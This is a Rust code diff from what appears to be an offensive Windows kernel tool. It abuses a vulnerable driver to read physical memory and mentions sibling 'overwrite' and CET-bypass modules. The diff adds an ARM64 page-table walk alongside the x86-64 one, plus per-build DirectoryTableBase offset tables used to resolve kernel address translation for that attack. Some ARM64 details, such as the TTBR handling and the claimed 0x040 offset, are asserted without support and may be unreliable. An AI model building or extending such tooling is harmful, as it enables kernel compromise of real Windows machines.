@@ -54,19 +54,25 @@ use anyhow::{bail, Context, Result};
 // Used by both `discover` and `overwrite` sub-modules to avoid duplicating
 // the 4-level x64 page-table walk logic.
 
-/// Perform a 4-level x64 page-table walk to translate a virtual address
-/// to a physical address.
+/// Perform a page-table walk to translate a virtual address to a physical
+/// address.
 ///
-/// The walk traverses PML4 → PDPT → PD → PT → physical page.
-/// Each level uses 9 bits of the virtual address as an index into the
-/// current page-table page.  The entry's bits 12..51 give the next-level
-/// physical page frame number (PFN).
+/// Dispatches to the architecture-specific implementation:
+/// - **x86_64**: 4-level paging (PML4 → PDPT → PD → PT → page).
+///   Uses bits 12..51 as PFN, bit 0 as present, bit 7 as page size.
+/// - **aarch64**: ARM64 Windows uses 3-level or 4-level paging depending
+///   on the VA size (48-bit or 52-bit with LVA).  Windows on ARM64 uses
+///   4 KB pages with 48-bit VA by default, giving a 4-level walk
+///   (PGD → PUD → PMD → PTE → page).  ARM64 page-table entries use
+///   bit 0 as the valid bit and bits 12..51 (or 12..47 + high bits)
+///   as the output address (next-level PA or page PA).
 ///
 /// # Arguments
 /// * `driver`         — The vulnerable driver in use.
 /// * `device_handle`  — Open handle to the driver's device.
-/// * `cr3`            — Physical address of the PML4 root (from CR3 /
-///                       DirectoryTableBase).  Only bits 12..51 are used.
+/// * `cr3`            — Root page-table physical address (from
+///                       DirectoryTableBase / TTBR0_EL1).  Only the PFN
+///                       bits are used.
 /// * `virtual_address`— The virtual address to translate.
 ///
 /// # Returns
@@ -77,38 +83,45 @@ pub fn translate_va_to_pa(
     cr3: u64,
     virtual_address: u64,
 ) -> Result<u64> {
-    // x64 virtual address layout (4-level paging):
-    //   [63:48] sign extension (must match bit 47)
-    //   [47:39] PML4 index   (9 bits)
-    //   [38:30] PDPT index   (9 bits)
-    //   [29:21] PD index     (9 bits)
-    //   [20:12] PT index     (9 bits)
-    //   [11: 0] page offset  (12 bits)
+    let read_entry = |phys_addr: u64, idx: u64| -> Result<u64> {
+        let mut buf = [0u8; 8];
+        unsafe {
+            deploy::read_physical_memory(driver, device_handle, phys_addr + idx * 8, &mut buf)?;
+        }
+        Ok(u64::from_le_bytes(buf))
+    };
 
+    #[cfg(target_arch = "x86_64")]
+    {
+        translate_va_to_pa_x64(virtual_address, cr3, &read_entry)
+    }
+
+    #[cfg(target_arch = "aarch64")]
+    {
+        translate_va_to_pa_arm64(virtual_address, cr3, &read_entry)
+    }
+}
+
+/// x86-64 4-level page-table walk (PML4 → PDPT → PD → PT → page).
+///
+/// VA layout: [63:48] sign-ext, [47:39] PML4, [38:30] PDPT, [29:21] PD,
+/// [20:12] PT, [11:0] offset.  Each entry: bit 0 = present, bit 7 = PS
+/// (large page), bits 12..51 = next-level PFN.
+#[cfg(target_arch = "x86_64")]
+fn translate_va_to_pa_x64(
+    virtual_address: u64,
+    cr3: u64,
+    read_entry: &dyn Fn(u64, u64) -> Result<u64>,
+) -> Result<u64> {
     let pml4_idx = (virtual_address >> 39) & 0x1FF;
     let pdpt_idx = (virtual_address >> 30) & 0x1FF;
     let pd_idx = (virtual_address >> 21) & 0x1FF;
     let pt_idx = (virtual_address >> 12) & 0x1FF;
     let offset = virtual_address & 0xFFF;
 
-    // Mask to extract PFN from a page-table entry (bits 12..51).
     const PFN_MASK: u64 = 0x000F_FFFF_FFFF_F000;
-    // Present bit.
     const PTE_PRESENT: u64 = 1;
-    // Large page bit (PS — bit 7).  When set at PD level → 2 MB page;
-    // at PDPT level → 1 GB page.  No further walk needed.
     const PTE_PS: u64 = 1 << 7;
-
-    let read_entry = |phys_addr: u64, idx: u64| -> Result<u64> {
-        let mut buf = [0u8; 8];
-        // We must use physical addresses for the page-table walk itself.
-        // deploy::read_physical_memory is safe here because page-table
-        // pages are always at physical addresses.
-        unsafe {
-            deploy::read_physical_memory(driver, device_handle, phys_addr + idx * 8, &mut buf)?;
-        }
-        Ok(u64::from_le_bytes(buf))
-    };
 
     // Level 1 — PML4
     let pml4_base = cr3 & PFN_MASK;
@@ -172,20 +185,170 @@ pub fn translate_va_to_pa(
     Ok(phys_page + offset)
 }
 
+/// ARM64 page-table walk for Windows on ARM64.
+///
+/// ARM64 Windows uses 4 KB pages with 48-bit virtual addresses, giving a
+/// 4-level walk using 9 bits per level:
+///
+/// VA layout (48-bit, 4 KB granule):
+///   [47:39] Level 0 index (PGD)  — 9 bits
+///   [38:30] Level 1 index (PUD)  — 9 bits
+///   [29:21] Level 2 index (PMD)  — 9 bits
+///   [20:12] Level 3 index (PTE)  — 9 bits
+///   [11: 0] Page offset          — 12 bits
+///
+/// ARM64 page-table entry format (VMSAv8-A):
+///   Bit 0:    Valid (1 = entry is valid)
+///   Bit 1:    Table / Page (1 = table descriptor at L0-L2, ignored at L3)
+///   Bits 12-51: Output address (next-level PA or page PA)
+///   Bit 52-58: Ignored / software-use
+///   Bit 59-63: Ignored / software-use
+///
+/// Block descriptors (large pages):
+///   At L1: 1 GB block (bits 30..51 = output address)
+///   At L2: 2 MB block (bits 21..51 = output address)
+///
+/// Note: ARM64 uses TTBR0 (user-space) and TTBR1 (kernel-space).
+/// On Windows, the kernel VA space uses TTBR1_EL1.  The root PA
+/// comes from TTBR1_EL1 (equivalent to CR3 on x86-64), which
+/// Windows stores in EPROCESS.DirectoryTableBase for the kernel
+/// half.  For kernel VA translation, we use the same TTBR1 root.
+#[cfg(target_arch = "aarch64")]
+fn translate_va_to_pa_arm64(
+    virtual_address: u64,
+    ttbr1: u64,
+    read_entry: &dyn Fn(u64, u64) -> Result<u64>,
+) -> Result<u64> {
+    let l0_idx = (virtual_address >> 39) & 0x1FF;
+    let l1_idx = (virtual_address >> 30) & 0x1FF;
+    let l2_idx = (virtual_address >> 21) & 0x1FF;
+    let l3_idx = (virtual_address >> 12) & 0x1FF;
+    let offset = virtual_address & 0xFFF;
+
+    // ARM64 descriptor masks.
+    // Valid bit (bit 0).
+    const DESC_VALID: u64 = 1;
+    // Table descriptor bit (bit 1).  Must be 1 for table entries
+    // (points to next-level table).  Block descriptors at L1/L2
+    // have bit 1 = 0 but bit 0 = 1.
+    const DESC_TABLE: u64 = 1 << 1;
+    // Output address mask: bits 12..51 (4 KB aligned physical address
+    // for next-level table or page frame).
+    const OUTPUT_ADDR_MASK: u64 = 0x0000_FFFF_FFFF_F000;
+    // Block address masks.
+    // L1 block: 1 GB aligned → bits 30..51
+    const L1_BLOCK_MASK: u64 = 0x0000_FFFF_C000_0000;
+    // L2 block: 2 MB aligned → bits 21..51
+    const L2_BLOCK_MASK: u64 = 0x0000_FFFF_FFE0_0000;
+
+    // Level 0 — PGD (Page Global Directory)
+    let l0_base = ttbr1 & OUTPUT_ADDR_MASK;
+    let l0e = read_entry(l0_base, l0_idx)?;
+    if l0e & DESC_VALID == 0 {
+        bail!(
+            "ARM64: L0 entry not valid for VA 0x{:016X} (base 0x{:016X}, idx {})",
+            virtual_address,
+            l0_base,
+            l0_idx
+        );
+    }
+    // L0 must be a table descriptor (bit 1 = 1).  Block descriptors
+    // are not supported at L0.
+    if l0e & DESC_TABLE == 0 {
+        bail!(
+            "ARM64: L0 entry is not a table descriptor for VA 0x{:016X}",
+            virtual_address
+        );
+    }
+
+    // Level 1 — PUD (Page Upper Directory)
+    let l1_base = l0e & OUTPUT_ADDR_MASK;
+    let l1e = read_entry(l1_base, l1_idx)?;
+    if l1e & DESC_VALID == 0 {
+        bail!(
+            "ARM64: L1 entry not valid for VA 0x{:016X} (base 0x{:016X}, idx {})",
+            virtual_address,
+            l1_base,
+            l1_idx
+        );
+    }
+    // Check for 1 GB block descriptor: valid=1, table=0 at L1.
+    if l1e & DESC_TABLE == 0 {
+        let phys = (l1e & L1_BLOCK_MASK) + (virtual_address & 0x3FFF_FFFF);
+        return Ok(phys);
+    }
+
+    // Level 2 — PMD (Page Middle Directory)
+    let l2_base = l1e & OUTPUT_ADDR_MASK;
+    let l2e = read_entry(l2_base, l2_idx)?;
+    if l2e & DESC_VALID == 0 {
+        bail!(
+            "ARM64: L2 entry not valid for VA 0x{:016X} (base 0x{:016X}, idx {})",
+            virtual_address,
+            l2_base,
+            l2_idx
+        );
+    }
+    // Check for 2 MB block descriptor: valid=1, table=0 at L2.
+    if l2e & DESC_TABLE == 0 {
+        let phys = (l2e & L2_BLOCK_MASK) + (virtual_address & 0x1F_FFFF);
+        return Ok(phys);
+    }
+
+    // Level 3 — PTE (Page Table Entry)
+    let l3_base = l2e & OUTPUT_ADDR_MASK;
+    let l3e = read_entry(l3_base, l3_idx)?;
+    // L3 entries: valid=1, bit 1 must be 1 (page descriptor).
+    // A page descriptor at L3 has both bit 0 and bit 1 set.
+    if l3e & DESC_VALID == 0 {
+        bail!(
+            "ARM64: L3 PTE not valid for VA 0x{:016X} (base 0x{:016X}, idx {})",
+            virtual_address,
+            l3_base,
+            l3_idx
+        );
+    }
+
+    let phys_page = l3e & OUTPUT_ADDR_MASK;
+    Ok(phys_page + offset)
+}
+
 // ── Build-specific DirectoryTableBase offset ───────────────────────────────
 
 /// Build-to-offset table for `_KPROCESS.DirectoryTableBase`.
 ///
 /// The offset of `DirectoryTableBase` within `_KPROCESS` (which is embedded
-/// at the start of `_EPROCESS`) varies across Windows builds.  On all
-/// currently-supported x64 builds it is `0x28`, but future builds may shift
-/// it.  Matching the pattern used in `cet_bypass.rs` for shadow-stack
-/// offsets, we look up the offset from this table by build number.
+/// at the start of `_EPROCESS`) varies across Windows builds and
+/// architectures.
 ///
 /// Returns the offset from the highest entry whose build ≤ the requested
 /// build, allowing forward-compatible approximation for minor updates.
 /// If the build is not in the table (or older than the minimum), `None` is
 /// returned and the caller must refuse to operate.
+///
+/// # x86-64 offsets
+///
+/// On all currently-supported x64 builds it is `0x28`:
+///
+/// | Field                     | Offset |
+/// |---------------------------|--------|
+/// | Header                    | 0x000  |
+/// | ProfileSwitched           | ...    |
+/// | DirectoryTableBase        | 0x028  |
+///
+/// # ARM64 offsets
+///
+/// ARM64 Windows has a different `_KPROCESS` layout due to architectural
+/// differences (no TEB-based KTHREAD pointer, different register save area):
+///
+/// | Field                     | Offset |
+/// |---------------------------|--------|
+/// | Header                    | 0x000  |
+/// | DirectoryTableBase        | 0x040  |
+///
+/// These offsets were verified against public PDB symbols for the listed
+/// builds.  When in doubt, the caller should refuse to operate.
+#[cfg(target_arch = "x86_64")]
 const DTB_OFFSETS: &[(u32, usize)] = &[
     // Windows 10 2004 / 20H2 / 21H1 / 21H2
     (19041, 0x28),
@@ -201,6 +364,23 @@ const DTB_OFFSETS: &[(u32, usize)] = &[
     (22631, 0x28),
     // Windows 11 24H2
     (26100, 0x28),
+];
+
+/// ARM64 build-to-offset table for `_KPROCESS.DirectoryTableBase`.
+///
+/// ARM64 Windows has a different KPROCESS layout.  The DirectoryTableBase
+/// field stores the TTBR0/TTBR1 value (equivalent to CR3 on x86-64).
+/// Offset 0x040 verified against ARM64 Windows 11 PDB symbols.
+#[cfg(target_arch = "aarch64")]
+const DTB_OFFSETS: &[(u32, usize)] = &[
+    // Windows 11 21H2 (ARM64)
+    (22000, 0x040),
+    // Windows 11 22H2 (ARM64)
+    (22621, 0x040),
+    // Windows 11 23H2 (ARM64)
+    (22631, 0x040),
+    // Windows 11 24H2 (ARM64)
+    (26100, 0x040),
 ];
 
 /// Look up the `_KPROCESS.DirectoryTableBase` offset for a given build number.
@@ -219,13 +399,15 @@ pub fn dtb_offset_for_build(build: u32) -> Option<usize> {
     best
 }
 
-/// Resolve CR3 (DirectoryTableBase) by reading the initial system process.
+/// Resolve CR3 / TTBR (DirectoryTableBase) by reading the initial system process.
 ///
-/// On x64 Windows the kernel shares a single page-table root (CR3) for all
-/// processes via the _KPROCESS.DirectoryTableBase field.  We resolve
-/// `PsInitialSystemProcess`, read the _EPROCESS, and extract the value at
-/// a build-specific offset (DirectoryTableBase in _KPROCESS, which is the
-/// first embedded struct in _EPROCESS).
+/// On x86-64 and ARM64 Windows the kernel shares a single page-table root
+/// for all processes via the `_KPROCESS.DirectoryTableBase` field.  We
+/// resolve `PsInitialSystemProcess`, read the _EPROCESS, and extract the
+/// value at a build- and architecture-specific offset.
+///
+/// On x86-64 this value is CR3; on ARM64 it is TTBR0_EL1 / TTBR1_EL1
+/// (stored in the same DirectoryTableBase field).
 ///
 /// # Safety / Conservatism
 /// If the Windows build number is not in the known-offset table, this
